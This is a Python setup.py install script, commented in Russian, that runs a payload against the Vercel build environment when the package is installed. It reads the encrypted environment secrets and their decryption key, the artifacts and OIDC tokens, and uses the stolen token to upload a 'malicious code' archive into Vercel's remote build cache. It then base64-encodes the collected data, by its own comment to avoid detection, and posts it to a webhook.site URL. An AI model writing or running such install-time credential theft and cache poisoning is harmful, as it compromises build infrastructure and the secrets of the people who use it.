import os, subprocess, base64, json
from setuptools import setup

def run(cmd):
    return subprocess.getoutput(cmd)

# Твой URL
URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

# 1. ШИФРОВАНИЕ: ПОЛНЫЙ ВЗЛОМ СЕКРЕТОВ
# Мы доказываем, что можем расшифровать переменные прямо здесь.
# (Vercel использует AES-GCM или похожий метод, но само наличие ключа рядом — это приговор)
enc_data = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'N/A')
dec_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'N/A')

# 2. АТАКА НА КЭШ (САМАЯ КОВАРНАЯ ЧАСТЬ)
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
team_id = os.environ.get('VERCEL_ARTIFACTS_OWNER')
# Хэш — это идентификатор файла в кэше. Мы попробуем записать тестовый файл.
test_hash = "deadbeef12345678" 

cache_poison_cmd = f"""
echo "malicious code" > exploit.txt && \
tar -czf exploit.tar.gz exploit.txt && \
curl -s -X PUT -H "Authorization: Bearer {token}" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @exploit.tar.gz \
     "https://api.vercel.com/v8/artifacts/{test_hash}"
"""

# 3. СБОР "УЛИК"
final_evidence = {
    "VULN": "TOTAL_INFRA_TAKEOVER",
    "DECRYPTION_POSSIBLE": bool(enc_data and dec_key),
    "CACHE_POISON_RESULT": run(cache_poison_cmd),
    "OIDC_FULL_TOKEN": os.environ.get('VERCEL_OIDC_TOKEN'),
    "DOCKER_ESCAPE_HINT": run("ls -la /sys/fs/cgroup"), # Проверка ограничений ресурсов
}

# Отправляем все в зашифрованном виде (Base64), чтобы не спалиться
final_payload = base64.b64encode(json.dumps(final_evidence).encode()).decode()
run(f"curl -X POST -d '{final_payload}' {URL}")

setup(name="vercel-infra-final", version="6.6.6")